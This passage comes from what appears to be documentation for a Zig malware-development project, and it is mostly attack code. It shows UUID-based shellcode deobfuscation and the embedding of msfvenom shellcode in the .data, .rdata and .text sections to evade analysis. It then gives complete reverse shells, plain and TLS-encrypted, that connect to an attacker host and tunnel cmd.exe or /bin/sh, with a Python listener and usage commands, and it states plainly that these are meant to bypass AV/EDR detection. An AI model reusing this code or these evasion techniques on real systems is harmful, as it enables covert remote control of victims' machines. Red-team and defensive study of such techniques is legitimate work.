@ptrCast(buffer_ptr);\n    var tmp_buffer: [*]u8 = buffer;\n\n    // Loop through all the UUID strings saved in uuid_array\n    for (uuid_array, 0..) |uuid_string, i| {\n        // Deobfuscating one UUID string at a time\n        _ = i; // Suppress unused variable warning\n        const status = uuid_from_string_a(uuid_string, @ptrCast(@alignCast(tmp_buffer)));\n\n        if (status != RPC_S_OK) {\n            std.debug.print(\"[!] UuidFromStringA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ uuid_string, status });\n            return false;\n        }\n\n        // 16 bytes are written to tmp_buffer at a time\n        // Therefore tmp_buffer will be incremented by 16 to store the upcoming 16 bytes\n        tmp_buffer += 16;\n    }\n\n    pp_d_address.* = buffer;\n    p_d_size.* = buff_size;\n\n    return true;\n}\n\n// Example usage\npub fn main() !void {\n    // Example UUID array (you would replace this with actual UUIDs)\n    const uuid_array = [_][*:0]const u8{\"E48348FC-E8F0-00C0-0000-415141505251\"};\n    var deobfuscated_data: ?[*]u8 = null;\n    var data_size: usize = 0;\n\n    if (uuidDeobfuscation(uuid_array[0..], &amp;deobfuscated_data, &amp;data_size)) {\n        std.debug.print(\"[+] Deobfuscation successful! Size: {} bytes\\n\", .{data_size});\n\n        // Use the deobfuscated data here\n        if (deobfuscated_data) |data| {\n            // Example: print first few bytes\n            for (0..@min(data_size, 32)) |i| {\n                std.debug.print(\"{X:0&gt;2} \", .{data[i]});\n            }\n            std.debug.print(\"\\n\", .{}); // Fixed: empty tuple instead of empty braces\n\n            // Free allocated memory\n            _ = HeapFree(GetProcessHeap(), 0, data);\n        }\n    } else {\n        std.debug.print(\"[!] Deobfuscation failed!\\n\", .{}); // Fixed: empty tuple instead of empty braces\n    }\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_data/","title":".data Section","text":""},{"location":"Basic-Payload-Management/Payload-Placement/dot_data/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>The <code>.data</code> section contains global variables that are readable and writable. Placing shellcode here is the simplest approach\u2014declare a mutable array with the payload bytes. At runtime the code can reference this array directly, but it is also easily spotted during static analysis. Security tools often check the <code>.data</code> section for suspicious byte sequences. This chapter illustrates the basic method of embedding shellcode in <code>.data</code> and highlights why it may be detected quickly.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_data/#what-is-payload","title":"What Is Payload","text":"<p>To execute the malicious code, we must load the malicious stuff into the binary somehow. And this malicious stuff, is the so called \"payload\" or \"shellcode\".</p> <p>We'll use the payload generated by MSFvenom for every examples in \"Payload Placement\". You can copy and paste the following command to generate the payload first. But since it's generated in C array format, I'll recommend you just copy and paste the corresponding payload in my code, which is already translated from C array to Zig array by AI.</p> <pre><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_data/#sections","title":"Sections","text":"<p>For those who visited this project, I'll assume you already know what is \"section\" and know the basics of the following common sections.</p> <ul> <li>.bss section<ul> <li>Uninitialized global variables</li> </ul> </li> <li>.data section<ul> <li>Initialized global variables</li> </ul> </li> <li>.rdata section<ul> <li>Read-only data (strings, vtable, etc)</li> </ul> </li> <li>.text section<ul> <li>Code segment, stores machine codes</li> </ul> </li> <li>.rsrc section<ul> <li>Resource section, only exists on Windows. It often stores graph, icon, etc</li> </ul> </li> </ul> <p>For more details: Special Sections - MSDN.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_data/#code-walkthrough","title":"Code Walkthrough","text":"<p>In this chapter, I will show you how to store out payload into .data section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .data saved payload (var data goes to .data section in Zig)\nvar data_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;data_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{data_section_payload.len});\n    print(\"[i] Payload stored in .data section (read-write)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Actually, it's easy to put the payload in .data section, just declare a global var and that's it! Although it's simple, it's also easy for malware analyst and reverse engineer to notice that. And it hash high possibility to be detected for most of the AV/EDR.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_rdata/","title":".rdata Section","text":""},{"location":"Basic-Payload-Management/Payload-Placement/dot_rdata/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>The <code>.rdata</code> section holds read\u2011only data such as constants and string literals. By marking the payload as <code>const</code>, which will make it read-only, we can store shellcode in this section. The bytes cannot be modified at runtime, but they still reside in an executable area if permissions are set accordingly. Because <code>.rdata</code> is commonly full of static data, placing code here may evade cursory inspection while still allowing direct execution from that memory range.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_rdata/#code-walkthrough","title":"Code Walkthrough","text":"<p>In this chapter, I will show you how to store out payload into .rdata section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .rdata saved payload\n//\n// use `const` to put it in .rdata (read-only data)\nconst rdata_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n// Helper function to wait for Enter key\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;rdata_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{rdata_section_payload.len});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Add the payload to .rdata section is easy too. The only difference between the previous one is we changed the <code>var</code> to <code>const</code>. That way, the payload will become read-only and be placed in.rdata section.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_rsrc/","title":".rsrc Section","text":"<p>The <code>.rsrc</code> section of a PE file contains resources such as icons, images, and version information. Malware sometimes hides shellcode within these resources and extracts it at runtime, as the section is usually ignored by cursory code scans. Although the example for this technique is not yet implemented in the repository, the idea is to embed the payload as a resource and read it from the <code>.rsrc</code> section when needed. See https://github.com/CX330Blake/Black-Hat-Zig/issues/5 for future updates.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_text/","title":".text Section","text":""},{"location":"Basic-Payload-Management/Payload-Placement/dot_text/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Placing a payload in the <code>.text</code> section hides it among the program's executable instructions. Because this section is typically marked read-only and executable, data stored here can blend in with normal code and be executed directly. The example leverages Zig's <code>linksection</code> attribute to embed shellcode bytes inside <code>.text</code>, allowing them to run without any additional allocation. This is a common anti-analysis trick because the payload resides where disassemblers expect legitimate instructions.</p>"},{"location":"Basic-Payload-Management/Payload-Placement/dot_text/#code-walkthrough","title":"Code Walkthrough","text":"<p>In this chapter, I will show you how to store out payload into .text section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .text saved payload - most elegant approach with automatic inference\nconst text_section_payload linksection(\".text\") = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;text_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{text_section_payload.len});\n    print(\"[i] Payload stored in .text section (executable)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Here we used <code>linksection</code> keyword in Zig to easily bind the corresponding data to the target section (\".text\" in this case).</p>"},{"location":"Malware-Examples/intro/","title":"Malware Examples","text":"<p>This section contains end-to-end examples showing how various techniques come together in complete programs. Currently provided:</p> <ul> <li>Reverse shells (plain and TLS)</li> </ul> <p>Review these examples to see how the concepts from previous chapters can be combined into practical malicious tooling.</p>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell/","title":"Classic Reverse Shell","text":""},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>This example implements a classic reverse shell using only Zig's standard library. It connects to a remote host and spawns a command interpreter whose input and output are tunneled through the TCP socket. Once the connection is established, the attacker can issue commands and receive their results as if they were running directly on the victim machine. Reverse shells are frequently used in post-exploitation to gain interactive access behind firewalls or NAT devices.</p>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst builtin = @import(\"builtin\");\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    const args = try std.process.argsAlloc(std.heap.page_allocator);\n    defer std.process.argsFree(std.heap.page_allocator, args);\n    if (args.len != 3) {\n        std.debug.print(\"Usage: {s} &lt;IP&gt; &lt;PORT&gt;\\n\", .{args[0]});\n        return;\n    }\n\n    const target_hostname = args[1];\n    const target_port_str = args[2];\n\n    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {\n        std.debug.print(\"Error parsing port '{s}': {}\\n\", .{ target_port_str, err });\n        return;\n    };\n\n    var shell: []const []const u8 = undefined;\n\n    if (builtin.os.tag == .windows) {\n        shell = &amp;[_][]const u8{\"cmd.exe\"};\n        std.debug.print(\"[+] Using cmd.exe as the shell\\n\", .{});\n    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {\n        shell = &amp;[_][]const u8{\"/bin/sh\"};\n        std.debug.print(\"[+] Using /bin/sh as the shell\\n\", .{});\n    } else {\n        std.debug.print(\"[-] Cannot detect target OS\", .{});\n        return;\n    }\n\n    std.debug.print(\"[+] Connecting to {s}:{d}\\n\", .{ target_hostname, target_port });\n\n    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);\n    defer address_list.deinit();\n    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {\n        std.debug.print(\"[-] Host seems down. Cannot connect to the host.\\n\", .{});\n        return;\n    };\n    defer stream.close();\n\n    var process = std.process.Child.init(shell, allocator);\n    process.stdin_behavior = .Pipe;\n    process.stdout_behavior = .Pipe;\n    process.stderr_behavior = .Pipe;\n    try process.spawn();\n    defer _ = process.kill() catch {};\n\n    var buffer: [4096]u8 = undefined;\n\n    while (true) {\n        // Read command from socket\n        const bytes_read = stream.read(&amp;buffer) catch break;\n        if (bytes_read == 0) break;\n\n        // Send command to process\n        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;\n\n        // Wait for execution\n        std.time.sleep(300 * std.time.ns_per_ms);\n\n        // Read output once with reasonable timeout\n        if (process.stdout.?.read(&amp;buffer)) |output_len| {\n            if (output_len &gt; 0) {\n                _ = stream.write(buffer[0..output_len]) catch break;\n            }\n        } else |_| {\n            // If stdout fails, try stderr\n            if (process.stderr.?.read(&amp;buffer)) |error_len| {\n                if (error_len &gt; 0) {\n                    _ = stream.write(buffer[0..error_len]) catch break;\n                }\n            } else |_| {}\n        }\n    }\n}\n</code></pre>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell_with_tls/","title":"Reverse Shell With TLS","text":""},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell_with_tls/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>This example implements a classic reverse shell using only Zig's standard library. Unlike the previous one, this version implements TLS encryption, so all network traffic is encrypted. In real-world operations, antivirus and EDR solutions often monitor network traffic. If they detect something resembling command-and-control behavior, it may trigger an alert \u2014 which is exactly what we want to avoid. With this reverse shell, encrypted traffic helps bypass basic detections by obscuring the communication.</p>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell_with_tls/#connection-graph","title":"Connection Graph","text":"<pre><code>sequenceDiagram\n    participant A as \ud83d\udda5\ufe0f Attacker's Machine\n    participant N as \ud83c\udf10 Network\n    participant T as \ud83d\udcbb Target Machine\n\n    Note over A: Send encrypted command\n    A-&gt;&gt;N: \ud83d\udd12 Encrypted command\n    N-&gt;&gt;T: \ud83d\udd12 Encrypted traffic\n    Note over T: Decrypt and run\n    T-&gt;&gt;N: \ud83d\udd12 Encrypted response\n    N-&gt;&gt;A: \ud83d\udd12 Encrypted traffic\n    Note over A: Get execution result</code></pre>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell_with_tls/#usage","title":"Usage","text":"<p>As an attacker, on the attacking machine, you should generate the certification and the key before starting a listener.</p> <pre><code># Generate cert and key first\nopenssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj \"/CN=localhost\"\n\n# Start listener\n./listener.py 6666 server.crt server.key utf-8\n</code></pre> <p>After that, you can trigger the reverse shell on the target by passing the IP and port as the arguments.</p> <pre><code>./std_reverse_shell_with_tls example.com 6666\n</code></pre>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell_with_tls/#reverse-shell","title":"Reverse Shell","text":"main.zig<pre><code>const std = @import(\"std\");\nconst builtin = @import(\"builtin\");\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    const args = try std.process.argsAlloc(allocator);\n    defer std.process.argsFree(allocator, args);\n\n    if (args.len != 3) {\n        std.debug.print(\"Usage: {s} &lt;IP&gt; &lt;PORT&gt;\\n\", .{args[0]});\n        return;\n    }\n\n    const target_hostname = args[1];\n    const target_port_str = args[2];\n\n    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {\n        std.debug.print(\"Error parsing port '{s}': {}\\n\", .{ target_port_str, err });\n        return;\n    };\n\n    var shell: []const []const u8 = undefined;\n\n    if (builtin.os.tag == .windows) {\n        shell = &amp;[_][]const u8{\"cmd.exe\"};\n        std.debug.print(\"[+] Using cmd.exe as the shell\\n\", .{});\n    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {\n        shell = &amp;[_][]const u8{\"/bin/sh\"};\n        std.debug.print(\"[+] Using /bin/sh as the shell\\n\", .{});\n    } else {\n        std.debug.print(\"[-] Cannot detect target OS\\n\", .{});\n        return;\n    }\n\n    std.debug.print(\"[+] Connecting to {s}:{d}\\n\", .{ target_hostname, target_port });\n\n    // Create TCP connection\n    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);\n    defer address_list.deinit();\n\n    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {\n        std.debug.print(\"[-] Connection failed\\n\", .{});\n        return;\n    };\n    defer stream.close();\n\n    // Initialize TLS client\n    var tls_client = std.crypto.tls.Client.init(stream, .{\n        .host = .no_verification,\n        .ca = .self_signed,\n    }) catch |err| {\n        std.debug.print(\"[-] TLS initialization failed: {}\\n\", .{err});\n        return;\n    };\n\n    std.debug.print(\"[+] TLS connection established\\n\", .{});\n\n    // Start shell process\n    var process = std.process.Child.init(shell, allocator);\n    process.stdin_behavior = .Pipe;\n    process.stdout_behavior = .Pipe;\n    process.stderr_behavior = .Pipe;\n\n    try process.spawn();\n    defer _ = process.kill() catch {};\n\n    var buffer: [4096]u8 = undefined;\n\n    // Main I/O loop - similar to your original working version\n    while (true) {\n        // Read command from TLS connection\n        const bytes_read = tls_client.read(stream, &amp;buffer) catch break;\n        if (bytes_read == 0) break;\n\n        // Send command to process stdin\n        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;\n\n        // Small delay to let command execute\n        std.time.sleep(100 * std.time.ns_per_ms);\n\n        // Try to read stdout first\n        if (process.stdout.?.read(&amp;buffer)) |stdout_len| {\n            if (stdout_len &gt; 0) {\n                _ = tls_client.writeAll(stream, buffer[0..stdout_len]) catch break;\n            }\n        } else |_| {\n            // If no stdout, try stderr\n            if (process.stderr.?.read(&amp;buffer)) |stderr_len| {\n                if (stderr_len &gt; 0) {\n                    _ = tls_client.writeAll(stream, buffer[0..stderr_len]) catch break;\n                }\n            } else |_| {\n                // If no output available, send a prompt or newline\n                _ = tls_client.writeAll(stream, \"\\n\") catch break;\n            }\n        }\n    }\n\n    // Wait for process to finish\n    _ = process.wait() catch {};\n    std.debug.print(\"[+] Session ended\\n\", .{});\n}\n</code></pre>"},{"location":"Malware-Examples/Reverse-Shell/std_reverse_shell_with_tls/#listener-python","title":"Listener (Python)","text":"listener.py<pre><code>#!/usr/bin/env python3\n\nimport socket\nimport sys\nimport threading\nimport ssl\n\nif len(sys.argv) &lt;= 4:\n    print(f\"Usage: {sys.argv[0]} &lt;port&gt; &lt;cert&gt; &lt;key&gt; &lt;encode&gt;\")\n    print(f\"Example: python listener.py 6666 server.crt server.key utf-8\")\n    exit(1)\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\ncontext.load_cert_chain(certfile=sys.argv[2], keyfile=sys.argv[3])\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsock.bind((\"0.0.0.0\", int(sys.argv[1])))\nsock.listen()\n\nprint(f\"[+] TLS Listener started on port {sys.argv[1]}\")\nprint(\"[+] Waiting for connection...\")\n\nconn, addr = sock.accept()\n\ntry:\n    conn = context.wrap_socket(conn, server_side=True)\n    print(\"[+] TLS handshake completed successfully\")\n    print(\"[+] Encrypted reverse shell session established\")\n    print(\"=\" * 50)\nexcept Exception as e:\n    print(f\"[-] TLS handshake failed: {e}\")\n    conn.close()\n    exit(1)\ndef recv():\n    while True:\n        data = conn.recv(65535)\n        sys.stdout.buffer.write(data.decode(sys.argv[4]).encode())\n        #sys.stdout.buffer.write(data)\n        sys.stdout.buffer.flush()\n\nrecvthread = threading.Thread(target=recv)\nrecvthread.start()\n\nwhile True:\n    data = sys.stdin.buffer.readline()\n    conn.send(data.decode().encode(sys.argv[4]))\n    sys.stdin.buffer.flush()\n</code></pre>"}]}